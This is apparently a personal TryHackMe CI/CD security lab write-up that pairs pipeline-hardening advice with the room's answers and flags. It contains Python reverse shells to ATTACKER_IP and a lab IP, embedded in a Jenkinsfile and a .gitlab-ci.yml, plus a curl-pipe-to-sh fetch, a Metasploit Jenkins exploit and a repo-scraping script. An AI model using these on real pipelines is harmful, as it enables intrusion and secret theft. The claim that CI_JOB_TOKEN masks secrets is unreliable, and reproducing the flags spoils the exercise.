
![pwned](https://github.com/user-attachments/assets/a52acb66-eb50-428a-85eb-076708cbfe33)

# Task 1 : Introduction

## CI/CD and Build Security Network

Welcome to the **CI/CD and Build Security** network! In this room, we will explore what it takes to secure a DevOps pipeline and the builds it produces. Understanding the potential risks and consequences of insecure build processes is essential for recognizing the urgency of implementing robust security measures. In this network, we will explore common insecurities and how threat actors can exploit these to compromise not only the process, but also production systems!

## Pre-Requisites

To get the most out of this network, it is recommended that participants have an understanding of the following concepts:

- **SDLC (Software Development Life Cycle)**
- **SSDLC (Secure Software Development Life Cycle)**
- **Intro to Pipeline Automation**
- **Dependency Management**

## Learning Objectives

By the end of this course, you will:

1. Understand the significance of **CI/CD and build system security** within the **DevSecOps** pipeline.
2. Explore the potential **risks and consequences** associated with insecure CI/CD pipelines and build processes.
3. Gain awareness of the importance of integrating robust **security measures** into the build processes to ensure integrity with the deployment of applications.
4. Learn about the practical **attacks** that can happen against misconfigured CI/CD pipelines and build processes.

## Conclusion

This network aims to equip you with the knowledge and skills necessary to identify and mitigate security risks within CI/CD pipelines, ultimately leading to more secure software development practices.


# Task 2 : Setting up

Let's get you connected to the **Nostromo** and the greater extra-terrestrial network!

## AttackBox

If you are using the **Web-based AttackBox**, you will be connected to the network automatically when you start the AttackBox from the room's page. To verify your connection, run the `ping` command against the IP of the GitLab host. Additionally, take note of your **VPN IP** by using `ifconfig` or `ip a` to identify the IP of the **cicd network adapter**. This IP will be used when performing attacks in the tasks.

## Configuring DNS

There are two important DNS entries for this network. It is simplest to embed these DNS entries directly into your hosts file, regardless of whether you are using the AttackBox or your own machine. Follow these steps:

1. Review the network diagram to note the IPs of the GitLab and Jenkins hosts.
2. Execute the following command in the terminal:

   ```bash
   sudo echo <Gitlab IP> gitlab.tryhackme.loc >> /etc/hosts && sudo echo <Jenkins IP> jenkins.tryhackme.loc >> /etc/hosts
   ```

3. If you need to re-add or update these entries, use your preferred text editor to modify the `/etc/hosts` file directly.
4. Once configured, navigate to `http://gitlab.tryhackme.loc` to verify access.

## Contacting MU-TH-UR 6000

As you progress through this network, you must report your work to the **MU-TH-UR 6000** mainframe, also known as **Mother**. You will need to register with Mother before you begin this journey. SSH is used for communication as detailed below:

- **SSH Username**: mother
- **SSH Password**: motherknowsbest
- **SSH IP**: X.X.X.250 (replace the X values using your network diagram)

Once authenticated, you can communicate with Mother. Follow the prompts to register for the challenge and save the information for future reference. Verify that you can access all relevant systems.

 **Note**: The VPN server and the Mother mainframe are **not in scope** for this network, and any security testing of these systems may lead to a ban from the network.

As you navigate the network, you will need to prove your compromises. Specific steps will be requested on the hosts you have compromised. Please note the hostnames in the network diagram, as this information will be essential. Flags can only be accessed from matching hosts.

 **Important**: If the network has been reset or you join a new subnet after your time expired, your Mother account will remain active.

# Task 3 : What is CI/CD and Build Security?


Establishing a secure build environment is crucial to safeguarding your software development process against potential threats and vulnerabilities. In light of recent events such as the SolarWinds supply chain attack, it has become increasingly evident that building a robust security foundation is imperative. This task will explore key strategies to create a secure build environment, considering the lessons learned from the SolarWinds use case.



## Fundamentals of CI/CD



According to Gitlab, there are eight fundamentals for CI/CD:



- **A single source repository** - Source code management should be used to store all the necessary files and scripts required to build the application.

- **Frequent check-ins to the main branch** - Code updates should be kept smaller and performed more frequently to ensure integrations occur as efficiently as possible.

- **Automated builds** - Builds should be automated and executed as updates are being pushed to the branches of the source code storage solution.

- **Self-testing builds** - As builds are automated, there should be steps introduced where the outcome of the build is automatically tested for integrity, quality, and security compliance.

- **Frequent iterations** - By making frequent commits, conflicts occur less frequently. Hence, commits should be kept smaller and made regularly.

- **Stable testing environments** - Code should be tested in an environment that mimics production as closely as possible.

- **Maximum visibility** - Each developer should have access to the latest builds and code to understand and see the changes that have been made.

- **Predictable deployments anytime** - The pipeline should be streamlined to ensure that deployments can be made at any time with almost no risk to production stability.



While all of these fundamentals will help to ensure that CI/CD can streamline the DevOps process, none of these really focus on ensuring that the automation does not increase the attack surface or make the pipeline vulnerable to attacks.



## A Typical CI/CD Pipeline



So what does a typical CI/CD-enabled pipeline look like? The network diagram of this room helps a bit to explain this. Let's work through the different components that can be found in this pipeline:



- **Developer workstations** - Where the coding magic happens, developers craft and build code. In this network, this is simulated through your AttackBox.

- **Source code storage solution** - This is a central placeholder to store and track different code versions. This is the Gitlab server found in our network.

- **Build orchestrator** - Coordinates and manages the automation of the build and deployment environments. Both Gitlab and Jenkins are used as build servers in this network.

- **Build agents** - These machines build, test and package the code. We are using GitLab runners and Jenkins agents for our build agents.

- **Environments** - Briefly mentioned above, there are typically environments for development, testing (staging) and production (live code). The code is built and validated through the stages. In our network, we have both a DEV and PROD environment.



Throughout this room, we will explore the CI/CD components in more detail and show the common security misconfigurations found here. It should be noted that DevOps pipelines with CI/CD can take many forms depending on the tools used, but the security principles that should be applied remain the same.



## SolarWinds Case



The SolarWinds breach was a significant cyberattack discovered in December 2020. The attackers compromised SolarWinds' software supply chain, injecting a malicious code known as SUNBURST into the company's Orion software updates. The attackers managed to gain unauthorised access to numerous organisations' networks, including government agencies and private companies. The breach highlighted the critical importance of securing software supply chains and the potential impact of a single compromised vendor on many entities.



We will use this case as we go through measures we can apply to ensure our build environment is secure. These measures are implementing isolation and segmentation techniques and setting up appropriate access controls and permissions to limit unauthorised access.



## Implement Isolation and Segmentation Techniques



The SolarWinds incident highlighted the significance of isolating and segmenting critical components within the build system. By separating different stages of the build process and employing strict access controls, you can mitigate the risk of a single compromised component compromising the entire system. Isolation can be achieved through containerisation or virtualisation technologies, creating secure sandboxes to execute build processes without exposing the entire environment.



## Set Up Appropriate Access Controls and Permissions



Limiting unauthorised access to the built environment is crucial for maintaining the integrity and security of the system. Following the principle of least privilege, grant access only to individuals or groups who require it to perform their specific tasks. Implement robust authentication mechanisms such as multi-factor authentication (MFA) and enforce strong password policies. Additionally, regularly review and update access controls to ensure that access privileges align with the principle of least privilege.



Implementing strict controls on privileged accounts is essential, including limiting the number of individuals with administrative access and strict monitoring and auditing mechanisms for privileged activities.



## A note on Network Security



Network security is vital in protecting the build system from external threats. Implementing appropriate network segmentation, such as dividing the built environment into separate network zones, can help contain potential breaches and limit lateral movement. Here are a few more essential points to consider:



- Implement secure communication channels for software updates and ensure that any third-party components or dependencies are obtained from trusted sources. 

- Regularly monitor and assess the security of your software suppliers to identify and address potential risks or vulnerabilities.



Learning from incidents such as the SolarWinds attack helps us recognise the critical importance of securing the entire build process, from code development to deployment, to safeguard against potential threats and ensure the trustworthiness of your software.

### What element of a CI/CD pipeline coordinates and manages the automation of build and deployment environments?
Build orchestrator
### What element of a CI/CD pipeline builds, tests, and packages code?
Build agents
### What fundamental of CI/CD promotes developers in having access to the latest builds and code in order to understand and see the changes that have been made?
Maximum visibility


# Task 4 : Creating your own Pipeline

## CI/CD Pipeline Setup and Overview

This guide outlines the process of creating and configuring a basic CI/CD pipeline using GitLab.

## GitLab Registration

1. **Account Creation**: Visit [http://gitlab.tryhackme.loc](http://gitlab.tryhackme.loc) and register an account.
2. **Explore GitLab**: This instance allows you to host your own Git server, similar to GitHub.

## Project Creation

1. **New Project**: Create or fork an existing project called `BasicBuild` for this tutorial.
2. **Fork Settings**: Set your namespace to your username and the project visibility to "Private".

## CI/CD Configuration

GitLab's CI/CD pipeline is managed using a `.gitlab-ci.yml` file, which defines automation steps triggered on new commits.

### Pipeline Stages

1. **Build Stage**: Contains `build-job` that prints a welcome message. Typically, this stage would load dependencies or compile code.
2. **Test Stage**: Includes `test-job1` and `test-job2`, which simulate tests to verify code functionality.
3. **Deploy Stage**: The `deploy-prod` job sets up a web server directory, copies website files, and hosts the application.

## Runner Registration

1. **Install GitLab Runner**: In GitLab, runners execute pipeline jobs. Install GitLab Runner on your machine.
2. **Register Runner**: Use the `gitlab-runner register` command to register your machine, setting it to handle all untagged jobs.

## Build Automation

1. **Start Build Process**: Make a new commit (e.g., edit `README.md`) to trigger the pipeline.
2. **Monitor Build**: View progress under `Build > Pipelines` in GitLab.

## Deployment Verification

Once the pipeline completes, access the deployed application at `http://127.0.0.1:8081/`.

## Notes

- To stop the hosted website, connect to the GitLab Runner screen session (`screen -r`) and terminate it.


### What is the name of the build agent that can be used with Gitlab?
Gitlab Runner
### What is the value of the flag you receive once authenticated to Timekeep?
THM{Welcome.to.CICD.Pipelines}

# Task 5 : Securing the build source



## Source Code Security

Securing the pipeline begins with securing the source code. Protecting source code involves addressing two main issues:

1. **Unauthorised Tampering**: Only authorized users should change the source code, necessitating control over who can push new code to repositories.
2. **Unauthorised Disclosure**: Some source code may be sensitive (e.g., proprietary code like Microsoft Word). It's crucial to prevent unintentional disclosures of such code.

## Confusion of Responsibilities

Large organizations often mistakenly believe that perimeter security is sufficient. This can lead to misconfigurations:

- **Registration Misconfigurations**: Allowing internal users to register for GitLab can significantly increase the attack surface. For example, in a bank with 10,000 employees, a breach could allow a compromised employee to access sensitive repositories.
- **Misconfigured Repos**: Developers might wrongly assume that internal accessibility allows for public sharing of sensitive repos. This misunderstanding can lead to unauthorized exposure of intellectual property.

## Exploiting a Vulnerable Build Source

When registered on GitLab, attackers can automate the process of enumerating publicly visible repositories. Although manual methods exist, automation ensures stealth and efficiency. To use automation:
```py

import gitlab
import uuid

# Create a Gitlab connection
gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='enterTokenHere')
gl.auth()

# Get all Gitlab projects
projects = gl.projects.list(all=True)

# Enumerate through all projects and try to download a copy
for project in projects:
    print ("Downloading project: " + str(project.name))
    #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
    UID = str(uuid.uuid4())
    print (UID)
    try:
        repo_download = project.repository_archive(format='zip')
        with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
            output_file.write(repo_download)
    except Exception as e:
        # Based on permissions, we may not be able to download the project
        print ("Error with this download")
        print (e)
        pass
```

1. **Install the GitLab Pip Package**.
```bash
pip3 install python-gitlab==3.15.0
```
Temporary patch from my side was to use:

```bash
alias python3=python3.9
```
2. Use a script to recover the list of all repositories, although the method should be stealthy.
3. Generate a GitLab API token to authenticate and execute the script for downloading all repos.

By examining the downloaded repositories, one can search for sensitive information using keywords.

## Securing the Build Source

Granular access control is essential for managing repositories effectively. Key strategies include:

- **Group-Based Access Control**: Organizing projects into groups simplifies permission management across multiple repositories.
- **Access Levels**: Assigning specific access levels (Guest, Reporter, Developer, Maintainer, Owner) ensures users have the necessary privileges.
- **Sensitive Information Protection**:
    - **`.gitignore`**: Prevents sensitive files from being versioned.
    - **Environment Variables**: Securely manage sensitive data separate from source code.
    - **Branch Protection**: Protect critical branches to enforce code review processes.

### Best Practices for Security

- Regularly review and update access permissions.
- Implement two-factor authentication (2FA).
- Monitor audit logs for access tracking.
- Scan repositories for sensitive information regularly.


### Which file specifies which directories and files should be excluded for version control?
.gitignore

### What can you protect to ensure direct pushes and vulnerable code changes are avoided?
branches

### What issue does lack of access control and unauthorised code changes lead to?
unauthorised tampering

### What is the API key stored within the Mobile application that can be accessed by any Gitlab user?

```bash
for file in *.zip; do
    unzip -p "$file" | grep -a -C 2 -i 'THM' && echo "Found in $file"
done
```
THM{You.Found.The.API.Key}


# Task 6 : Securing the Build Process

The build process in CI/CD pipelines is vulnerable to attacks if not properly configured. Ensuring its security can prevent a range of issues, from remote code execution vulnerabilities to dependency hijacking. Here are some best practices to secure the build process:

## 1. **Managing Dependencies**
   - **Supply Chain Attacks**: Regularly audit and verify third-party dependencies to prevent malicious code injection from compromised libraries.
   - **Dependency Confusion**: When using internal dependencies, guard against dependency confusion by configuring secure, private repositories to manage these dependencies.

## 2. **Configuring Build Triggers**
   - **Define What Actions Trigger Builds**: Limit builds to specific branches, such as `main`, to reduce unnecessary build executions.
   - **Control Build Permissions**: Restrict who can trigger builds and create merge requests on sensitive branches to limit unauthorized pipeline access.
   - **Segment Build Environments**: Use separate build agents for different branches (e.g., `DEV` vs. `PROD`) to ensure isolation and reduce risk.

## 3. **Isolate and Contain Builds**
   - **Containerized Builds**: Use isolated containers to run builds, limiting the impact of a compromised build and ensuring a consistent environment.
   - **Least Privilege**: Grant minimal access to CI/CD tools and pipelines, limiting their permissions to only necessary resources.

## 4. **Secure Secrets and Sensitive Data**
   - **Secret Management**: Use CI/CD tools' built-in secret management features to securely store and inject secrets into builds.
   - **Avoid Exposure**: Use masked variables and ensure sensitive data isn’t logged. Test pipelines to ensure no sensitive information leaks in logs.

## 5. **Immutable Artifacts**
   - **Artifact Security**: Store build artifacts in a secure registry with controlled access to prevent tampering.
   - **Version Control**: Track artifact versions to allow for audits and quickly address any compromised artifacts.

## 6. **Dependency Scanning and Updates**
   - **Automated Scanning**: Integrate dependency and vulnerability scanning tools into the pipeline to detect known security issues.
   - **Regular Updates**: Keep dependencies and CI/CD tools up-to-date to mitigate known vulnerabilities.

## 7. **Pipeline as Code**
   - **Version-Controlled Pipelines**: Define CI/CD configurations as code, stored alongside source code in version control for easier audits and tracking.
   - **Review Changes**: Regularly review changes in pipeline code (e.g., Jenkinsfile, GitLab CI files) for any unauthorized modifications.

## 8. **Monitoring and Logging**
   - **Monitor Builds**: Implement logging and monitoring for build activity, including unusual or unauthorized actions.
   - **Integrate Security Monitoring**: Link CI/CD logs with broader security monitoring systems for better visibility into build pipeline activity.

## 9. **Common Configuration Pitfalls to Avoid**
   - **Avoid On-Merge Builds for External Contributors**: This can expose build agents to arbitrary code from forked repositories, potentially compromising systems.
   - **Control Access to CI Files**: Only authorized users should be able to edit pipeline configurations (like Jenkinsfiles), preventing tampering with build instructions.

By adopting these practices, you can enhance the security posture of your CI/CD build process, minimizing the risk of compromise and ensuring code integrity from the outset.

### Where should you store artefacts to prevent tampering?
secure registry

### What mechanism should you always use to store and inject sensitive data?
secret management

### What attack can malicious actors perform to inject malicious code in the build process?
dependency confusion

### Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1?
THM{7753f7e9-6543-4914-90ad-7153609831c3}

For this I used :

```bash
/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

```


```py
python3 -m http.server 8080
```


```textarea

pipeline {
    agent any
    stages {
       stage('build') {
          steps {
              sh '''
                    curl http://ATTACKER_IP:8080/shell.sh | sh
                '''                 
              }             
          }
       }       
    }

```

```textarea

root@AttackBox:~$ nc -lvp 8081
Listening on 0.0.0.0 8081
Connection received on jenkins.tryhackme.loc 55994
/bin/sh: 0: can't access tty; job control turned off
$ whoami
ubuntu
```


# Task 7 : Securing the build Server


## Overview
Our build process is secured, but the build server itself remains vulnerable. If an attacker gains access to the build server, they could compromise both the pipeline and the build artifacts.

## Build Server Basics

1. **Access Control**: Secure the build server by enforcing strict access controls.
   - Use unique credentials for each user.
   - Implement multi-factor authentication (MFA).

2. **Credential Hygiene**: Avoid using default credentials like `jenkins:jenkins`, as these are often targeted in brute-force attacks.

## Exposed Build Server

### Accessing Jenkins
- **URL**: `http://jenkins.tryhackme.loc:8080/`
- **Login Attempt**: Using default credentials (`jenkins:jenkins`) may allow unauthorized access.

### Using Metasploit to Attack Jenkins
1. Launch Metasploit:
   ```bash
   msfconsole
    msf6 > use exploit/multi/http/jenkins_script_console
    msf6 exploit(multi/http/jenkins_script_console) > set target 1
    msf6 exploit(multi/http/jenkins_script_console) > set payload linux/x64/meterpreter/bind_tcp
    msf6 exploit(multi/http/jenkins_script_console) > set username jenkins
    msf6 exploit(multi/http/jenkins_script_console) > set password jenkins
    msf6 exploit(multi/http/jenkins_script_console) > set RHOST jenkins.tryhackme.loc
    msf6 exploit(multi/http/jenkins_script_console) > run
    ```

### Manual Exploitation
You can access the Jenkins script console to execute Groovy scripts for command execution.

## Protecting the Build Server

To safeguard the build server and agents, follow these best practices:

- **Build Agent Configuration**: Ensure build agents only connect to the build server and are not exposed externally.
- **Private Network**: Isolate build agents in a private network with no direct internet access.
- **Firewalls**: Restrict incoming traffic to only essential build server connections.
- **VPN**: Use a VPN for secure remote access to the build server and agents.
- **Token-Based Authentication**: Use tokens to authenticate build agents securely.
- **SSH Keys**: For SSH-based agents, use secure SSH keys.
- **Continuous Monitoring**: Regularly monitor build server and agent logs for unusual activity.
- **Regular Updates**: Keep build servers and agents up-to-date with security patches.
- **Security Audits**: Conduct periodic security audits to address potential vulnerabilities.
- **Harden Configuration**: Remove default credentials, disable weak configurations, and apply hardening techniques.

### What can be used to ensure that remote access to the build server can be performed securely?
VPN

### What can be used to add an additional layer of authentication security for build agents?
Token-based authentication

### Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2?
THM{1769f776-e03c-40b6-b2eb-b298297c15cc}

# Task 8 : Securing the build Pipeline

## Overview
Even with a secure build server, the pipeline remains vulnerable, especially if a developer account is compromised. To safeguard against such risks, we can implement **access gates** and other protections within the CI/CD pipeline.

## Access Gates

Access gates, or checkpoints, are stages in the pipeline that ensure code progresses only after meeting quality and security standards.

- **Enhanced Control**: Control code progression through pipeline stages.
- **Quality Control**: Ensure code meets quality standards before advancing.
- **Security Checks**: Run security assessments (e.g., vulnerability scans) before deployment.

### Implementation Steps

1. **Manual Approvals**: Require human review before advancing stages.
2. **Automated Tests**: Use automated tests for quality and functionality.
3. **Security Scans**: Integrate security tools to detect vulnerabilities.
4. **Release Gates**: Confirm documentation and compliance before release.
5. **Environment Validation**: Verify the deployment environment.
6. **Rollback Plan**: Ensure a rollback plan is in place.
7. **Monitoring**: Monitor post-deployment performance.
8. **Parallel Gates**: Use parallel gates to speed up the pipeline.
9. **Auditing**: Regularly audit gate configurations and results.

## Two-Person Concept

To further secure access gates, enforce a two-person rule:
- The developer initiating the build cannot pass the gate themselves.
- Increase required approvals to 2 when single-user verification isn’t possible.

## Exploiting Misconfigured Access Gates

Example: A misconfiguration in GitLab allows a developer to bypass the two-person rule by self-approving a merge request. This occurs because:
1. Policies not enforced with technology are ineffective.
2. Merge requests without enforced approval allow unintended main branch changes.

### Exploitation Outcome

By merging unauthorized changes to the main branch, an attacker could compromise the GitLab runner and execute unauthorized code. Adjusting `.gitlab-ci.yml` can enable command execution on the runner.

## Protecting the Pipeline

Follow these best practices to secure the GitLab CI/CD pipeline:

1. **Limit Branch Access**: Restrict main branch access to trusted developers.
2. **Review Merge Requests**: Enforce multiple approvals for merge requests.
3. **Use CI/CD Variables**: Store sensitive data in secure CI/CD variables.
4. **Limit Runner Access**: Restrict job execution to trusted runners with tags.
5. **Access Control and Permissions**: Enforce least privilege by reviewing access levels.
6. **Regular Audits**: Periodically audit pipeline configurations and permissions.
7. **Monitor and Alert**: Set up monitoring and alerts for unusual activities.

By following these steps, you can significantly enhance the security of your pipeline and protect it from unauthorized code execution.

### What can we add so that merges are raised for review instead of pushing the changes to code directly?
merge requests
### What should we do so that only trusted runners execute CI/CD jobs?
limit runner access
### Authenticate to Mother and follow the process to claim Flag 3. What is Flag 3?
THM{2411b26f-b213-462e-b94c-39d974e503e6}

Editing the gitlab-ci.yml file like that: 
``` textarea
   stages:
     - deploy

   production:
     stage: deploy
     script:
       - /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.50.1.29",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
     environment:
       name: ${CI_JOB_NAME}

```

```shell
nc -lvp 8081
```

And follow the mother rules.


# Task 9 : Securing the Build Environment


To ensure our pipeline remains secure, we must focus on protecting the deployment environments. The final step in securing our build process is to prevent threats during deployment.

## Environment Segregation

Segregating environments is essential to prevent unauthorized access, particularly between Development (DEV) and Production (PROD) environments. Key practices include:
- **Separate Permissions**: DEV environments may grant developers more access than PROD, so it’s critical to keep them isolated.
- **Pipeline Channels**: Restricting direct access may not be sufficient; side channels within the pipeline can allow access if misconfigured.

## The "One Build Agent to Rule Them All" Risk

Using a single build agent for both DEV and PROD environments introduces risks. For example:
- If a DEV pipeline is compromised, attackers can exploit access to intercept a PROD build if the same agent or runner is used.
- In this scenario, using the same GitLab runner for DEV and PROD means a compromise in DEV can allow access to PROD.

## Protecting the Build Environment

Follow these best practices to secure your build environments and prevent cross-environment access issues:

### 1. Isolate Environments
   - **Separate Runners**: Assign dedicated runners or runner tags for DEV and PROD environments.
   - **Pipeline Isolation**: Ensure a breach in the DEV environment cannot impact PROD.

### 2. Restrict CI/CD Job Access
   - **Limit Runner Access**: Only authorized personnel should have access to the runner host.
   - **Protected CI/CD Environments**: Use GitLab's "Protected CI/CD environments" to control deployment permissions.
   - **Permissions**: Restrict who can modify pipeline configurations, such as `.gitlab-ci.yml`.

### 3. Monitoring and Alerting
   - **Activity Monitoring**: Continuously monitor the CI/CD pipeline and runners for suspicious activity.
   - **Alerting**: Set up alerts for unusual activity, especially failed builds, which could indicate a security issue.
   - **Periodic Access Reviews**: Regularly audit access permissions for environments and revoke unneeded access.

By implementing these protections, we can effectively secure both DEV and PROD environments and reduce the risk of cross-environment compromises.


### What should you do so that a compromised environment doesn't affect other environments?
isolate environments

### Authenticate to Mother and follow the process to claim Flag 4 from the DEV environment. What is Flag 4?
THM{28f36e4a-7c35-4e4d-bede-be698ddf0883}

### Authenticate to Mother and follow the process to claim Flag 5 from the PROD environment. What is Flag 5?
THM{e9f99dbe-6bae-4849-adf7-18a449c93fe6}


# Task 10 : Securing the Build Secrets


With segregated runners in place, the last task is to ensure that our build secrets (GitLab CI/CD variables) are also protected. If secrets aren’t scoped correctly, they can leak between environments, allowing access to production variables from a development environment.

## The "One Secret to Rule Them All" Risk

Even if pipelines are segregated, secrets need strict environment-specific scoping. Without this, developers with DEV access could potentially use PROD secrets, compromising the production environment. For example, the `API_KEY` in PROD could be accessible in DEV if improperly scoped. Testing these configurations can reveal if any secrets are being exposed between environments.

## Protecting Build Secrets

To safeguard secrets within GitLab CI/CD, consider these practices:

### 1. Masking Variables

GitLab provides "masked variables" to prevent secret exposure in job logs. To mask a variable:
   - Use `CI_JOB_TOKEN`, which GitLab sets automatically, to mask sensitive information in scripts.
   - Example:
     ```yaml
     my_job:
       script:
         - echo "$MY_SECRET_KEY" # Exposes the secret
         - echo "masked: $CI_JOB_TOKEN" # Masks the secret
     ```

### 2. Using Secure Variables

To store secrets securely:
   - Navigate to **Settings > CI/CD > Variables** in your GitLab project.
   - Add a variable and select the "Masked" option. Masked variables won’t appear in job logs.
   - Use these variables in your `.gitlab-ci.yml` file to keep them hidden.

   **Important**: Ensure job scripts don’t accidentally output sensitive data, even with masking enabled.

### 3. Access Control

Restrict access to CI/CD variables and logs:
   - Only authorized users should have access to logs and variable settings.
   - Use project-level and group-level permissions to limit access and enforce least privilege.

Following these best practices for secret management helps ensure that sensitive data remains protected and only accessible where needed. This final step secures our pipeline against unauthorized access, completing our build security strategy.


### Is using environment variables enough to protect the build secrets? (yay or nay)
Nay

### What is the value of the PROD API_KEY?
THM{Secrets.are.meant.to.be.kept.Secret}

-> Editing the gitlab-ci file to print the key value.


# Task 11: Conclusion

Based on the misconfigurations and attacks observed, it’s clear that:

1. **Pipeline Security is a Priority**  
   Ensuring the security of your CI/CD pipeline is essential for protecting code and data integrity.

2. **Access Controls are Fundamental**  
   Restrict access to critical branches, environments, and CI/CD variables. This is the first line of defense against unauthorized changes and data exposure.

3. **Runner Security is Essential**  
   Securing the machines running GitLab Runner, combined with strong authentication, helps prevent breaches and unauthorized access.

4. **Secrets Management Matters**  
   Protect sensitive data (API keys, passwords) with GitLab CI/CD variables using masking and secure storage. Avoid using plain environment variables.

5. **Isolate Environments**  
   Segregating development (DEV) and production (PROD) environments minimizes risks, reducing the chances of compromising PROD from DEV.

6. **Continuous Vigilance**  
   Regularly review access permissions, scripts, and security configurations. Implement monitoring and alerting for ongoing security.

7. **Education is Key**  
   Educate your team on security best practices to maintain a robust security posture.

Securing your CI/CD pipeline with these best practices strengthens your organization’s overall security and minimizes vulnerabilities.
